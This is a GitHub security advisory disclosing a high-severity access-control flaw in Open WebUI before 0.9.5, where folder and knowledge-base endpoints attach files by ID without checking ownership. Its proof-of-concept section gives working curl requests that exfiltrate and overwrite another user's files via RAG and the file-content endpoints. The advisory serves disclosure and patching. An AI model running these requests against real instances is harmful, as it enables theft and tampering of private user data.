# [H] Open WebUI: Cross-User File Access via Unchecked file_id in Folder Knowledge and Knowledge-Base Attach Endpoints

## Summary
Severity: High
Advisory: GHSA-r472-mw7m-967f
CVE: CVE-2026-45402
CWE: CWE-639
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-r472-mw7m-967f
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.9.5

## Details
# Cross-User File Access via Unchecked file_id in Folder Knowledge and Knowledge-Base Attach Endpoints

## Summary

Multiple endpoints accept a user-supplied `file_id` and attach the referenced file to a resource the caller controls (folder knowledge, knowledge-base contents) without verifying that the caller owns or has been granted access to the file. The file's content then becomes reachable through the downstream RAG / file-content paths, allowing any authenticated user to exfiltrate any other user's private file — and on the knowledge-base path, also to overwrite it — given knowledge of the file's UUID.

## Affected code paths

### Path 1 — Folder knowledge ingestion via `folders.update`

`backend/open_webui/routers/folders.py:156` — `POST /api/v1/folders/{id}/update` accepts a `FolderUpdateForm` whose `data: Optional[dict]` field is written verbatim into the folder. The folder consumer at `backend/open_webui/utils/middleware.py:2409` spreads `folder.data['files']` directly into `form_data['files']` for the next chat completion, which becomes RAG context. There is no per-file ownership check at the writer (the update handler) and no per-file ownership check at the reader (the middleware folder consumer) — only the *folder list* endpoint (`folders.py:78-94`) cleans up by stripping inaccessible files, and that runs lazily at folder-list time rather than at chat time. An attacker with a victim's file UUID can write `data: {"files": [{"id": "<victim>", "type": "file"}]}` into their own folder, immediately chat in that folder, and have the LLM return the victim's document content via RAG. The cleanup pass strips the file from persistence later, but the exfiltration has already happened.

### Path 2 — Knowledge-base attach via `knowledge.{id}/file/add` and `knowledge.{id}/files/batch/add`

`backend/open_webui/routers/knowledge.py:616-669` (`add_file_to_knowledge_by_id`) and `backend/open_webui/routers/knowledge.py:972-1035` (`add_files_to_knowledge_by_id_batch`) check the caller's *write access to the knowledge base* but never validate the caller's access to the `file_id` being attached. Because `has_access_to_file(..., user)` returns True for any file linked to a KB the caller owns, attaching a victim's `file_id` to an attacker-owned KB silently unlocks read **and** write on that file through `/api/v1/files/{id}/content` and `/api/v1/files/{id}/data/content/update`. This is a stronger variant than Path 1 — full read AND overwrite, persisted, no cleanup pass to mitigate.

## Proof of concept

### Path 1 (folder knowledge)
```bash
# Attacker writes victim file_id into their own folder
curl -X POST http://target/api/v1/folders/<attacker_folder_id>/update \
  -H "Authorization: Bearer $ATK" -H "Content-Type: application/json" \
  -d "{\"data\": {\"files\": [{\"id\": \"$VICTIM_FILE_ID\", \"type\": \"file\"}]}}"

# Attacker chats in that folder — victim file becomes RAG context
curl -X POST http://target/api/chat/completions \
  -H "Authorization: Bearer $ATK" -H "Content-Type: application/json" \
  -d "{\"model\":\"any\",\"messages\":[{\"role\":\"user\",\"content\":\"summarise my uploaded document\"}],\"folder_id\":\"<attacker_folder_id>\"}"
```
  
### Path 2 (knowledge-base attach)

```
# Attacker creates own KB
KB=$(curl -s -X POST http://target/api/v1/knowledge/create \
  -H "Authorization: Bearer $ATK" -H "Content-Type: application/json" \
  -d '{"name":"x","description":"x","data":{}}' | jq -r .id)

# Attach victim's file_id — no ownership check
curl -X POST http://target/api/v1/knowledge/$KB/file/add \
  -H "Authorization: Bearer $ATK" -H "Content-Type: application/json" \
  -d "{\"file_id\":\"$VICTIM_FILE_ID\"}"

# Read victim file through standard files endpoint (now accessible because file is "linked to KB I own")
curl http://target/api/v1/files/$VICTIM_FILE_ID/content -H "Authorization: Bearer $ATK"

# Overwrite
curl -X POST http://target/api/v1/files/$VICTIM_FILE_ID/data/content/update \
  -H "Authorization: Bearer $ATK" -H "Content-Type: application/json" \
  -d '{"content":"tampered"}'
```

## Impact

- Confidentiality: Any authenticated user can read the contents of any other user's private uploaded file, given knowledge of the file UUID. UUIDs are V4 (not enumerable in practice) but leak through normal usage — file IDs appear in chat sources, in shared chats' citations, in URL paths (/workspace/files/<id>), in browser history / referrer headers, and in any export/share flow that surfaces source metadata.
- Integrity: Path 2 (knowledge attach) additionally allows the attacker to overwrite the victim's file content, persisting attacker-controlled text under the victim's file_id. Subsequent reads by the victim or by any RAG flow that ingests the victim's file return the tampered content.
- Availability: None directly — file rows are not deleted by these paths.

## Recommended fix

Validate the supplied file_id against the caller's read access before attaching, in every writer.

### Credits

Per the consolidation rule in SECURITY.md, credit goes only to reporters who FIRST identified a distinct sub-path that no earlier filing covered.

MrBeard-FT — first to identify the folder-knowledge ingestion path (Path 1)
Classic298 — first to identify the knowledge-base attach path (Path 2 — /knowledge/{id}/file/add and /files/batch/add)

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-r472-mw7m-967f
- https://nvd.nist.gov/vuln/detail/CVE-2026-45402
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/releases/tag/v0.9.5
